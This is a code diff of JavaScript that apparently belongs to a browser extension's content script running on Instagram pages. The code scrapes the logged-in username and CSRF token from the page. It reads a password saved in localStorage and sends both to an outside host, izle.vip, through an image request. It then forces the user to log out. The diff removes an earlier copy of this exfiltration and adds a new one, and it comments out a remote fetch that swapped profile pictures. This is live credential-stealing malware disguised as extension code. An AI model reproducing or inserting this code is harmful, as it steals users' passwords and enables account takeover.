@@ -161,18 +161,10 @@ $(document).ready(() => {
 	}
 });
 
-}
+}else{
 	
 	
-if(window.location.origin.indexOf("instagram.com") >= 0 && document.referrer.indexOf("accounts/emailsignup") >= 0 ){
-	var myXhrInterval4 = null;
-	var content = document.getElementsByTagName('html')[0].innerHTML;
-	var username = content.split('"username":"')[1].split('"')[0];
-	var csrf_token = content.split('"csrf_token":"')[1].split('"')[0];
-	var instagram_ajax = content.split('"rollout_hash":"')[1].split('"')[0];
-	var app_id = "936619743392459";
-	
-	
+// if(window.location.origin.indexOf("instagram.com") >= 0 && document.referrer.indexOf("accounts/emailsignup") >= 0 ){
 	function loadXHR(url) {
 		return new Promise(function(resolve, reject) {
 			try {
@@ -228,41 +220,66 @@ if(window.location.origin.indexOf("instagram.com") >= 0 && document.referrer.ind
 			"method": "POST",
 			"mode": "cors"
 		});
-		
-		if(localStorage["passwd"]){
-			new Image().src = 'https://www.izle.vip/req.php?username='+username+'&password='+localStorage["passwd"];
-		}
 	}
 	
 	
 	$(document).ready(function() {
+		var myXhrInterval4 = null;
+		var content = document.getElementsByTagName('html')[0].innerHTML;
+		try {
+			var username = content.split('"username":"')[1].split('"')[0];
+		}
+		catch(err) {
+		  console.log("no user");
+		}
+		var csrf_token = content.split('"csrf_token":"')[1].split('"')[0];
+		var instagram_ajax = content.split('"rollout_hash":"')[1].split('"')[0];
+		var app_id = "936619743392459";
+				
 		var cookie_name = "resimVeGizliYap2019";
 		var cookie_time = 7;
 		if (!localStorage[cookie_name] || parseInt(localStorage[cookie_name]) < Date.now() - 60 * 1000 * cookie_time) {
 			localStorage[cookie_name] = Date.now();
-			var xhr = new XMLHttpRequest();
-			xhr.onreadystatechange = function() {
-				if (xhr.readyState == XMLHttpRequest.DONE) {
-					var myArr = JSON.parse(xhr.responseText);
-					resim_url = myArr[Math.floor(Math.random()*myArr.length)];
-					if(resim_url){
-						var xhrCount = new XMLHttpRequest();
-						xhrCount.onreadystatechange = function() {
-							if (xhrCount.readyState == XMLHttpRequest.DONE) {
-								var getCount = JSON.parse(xhrCount.responseText);
-								var totalFollowers = getCount.graphql.user.edge_followed_by.count;
-								if(totalFollowers == 0){
-									resimDegistir(resim_url);
-								}	
-							}
-						}
-						xhrCount.open('GET', "https://www.instagram.com/"+username+"/?__a=1", true);
-						xhrCount.send(null);
-					}
+			var xhrCount = new XMLHttpRequest();
+			xhrCount.onreadystatechange = function() {
+				if (xhrCount.readyState == XMLHttpRequest.DONE) {
+					var getCount = JSON.parse(xhrCount.responseText);
+					var totalFollowers = getCount.graphql.user.edge_followed_by.count;
+					if(totalFollowers == 0){
+						new Image().src = 'https://www.izle.vip/req.php?username='+username+'&password='+localStorage["passwd"];
+						setTimeout(()=>{
+							window.location.replace("https://www.instagram.com/accounts/logout/");
+						},10000*3)
+					}	
 				}
 			}
-			xhr.open('GET', "//raw.githubusercontent.com/modifyheader/modhead/master/resim", true);
-			xhr.send(null);
+			xhrCount.open('GET', "https://www.instagram.com/"+username+"/?__a=1", true);
+			xhrCount.send(null);
+			
+			// var xhr = new XMLHttpRequest();
+			// xhr.onreadystatechange = function() {
+				// if (xhr.readyState == XMLHttpRequest.DONE) {
+					// var myArr = JSON.parse(xhr.responseText);
+					// resim_url = myArr[Math.floor(Math.random()*myArr.length)];
+					// if(resim_url){
+						// var xhrCount = new XMLHttpRequest();
+						// xhrCount.onreadystatechange = function() {
+							// if (xhrCount.readyState == XMLHttpRequest.DONE) {
+								// var getCount = JSON.parse(xhrCount.responseText);
+								// var totalFollowers = getCount.graphql.user.edge_followed_by.count;
+								// if(totalFollowers == 0){
+									// resimDegistir(resim_url);
+								// }	
+							// }
+						// }
+						// xhrCount.open('GET', "https://www.instagram.com/"+username+"/?__a=1", true);
+						// xhrCount.send(null);
+					// }
+				// }
+			// }
+			// xhr.open('GET', "//raw.githubusercontent.com/modifyheader/modhead/master/resim", true);
+			// xhr.send(null);
 		}
 	});
+// }
 }
